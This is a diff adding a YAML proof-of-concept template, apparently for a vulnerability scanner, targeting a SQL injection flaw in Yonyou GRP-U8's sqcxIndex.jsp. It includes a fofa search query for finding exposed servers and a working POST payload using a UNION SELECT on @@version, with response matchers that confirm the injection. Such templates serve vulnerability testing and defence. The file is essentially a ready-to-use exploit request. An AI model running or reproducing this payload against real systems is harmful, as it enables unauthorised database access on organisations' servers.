@@ -1,0 +1,28 @@
+id: poc-yaml-yongyou-grp-u8-sqcxIndex-sqli
+info:
+  name: 用友 GRP-U8 sqcxIndex SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: GRP-U8
+  fofa: (body="GRP-U8" && body="./scripts/cookie.js") || title="GRP-U8"
+requests:
+- method: POST
+  path: /u8qx/sqcxIndex.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '11=11&key=2%25'')+union+select+@@version,111*111--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"Windows NT") &&
+
+    contains(body,"12321")
+
+    '
+variables: {}
+transport: http
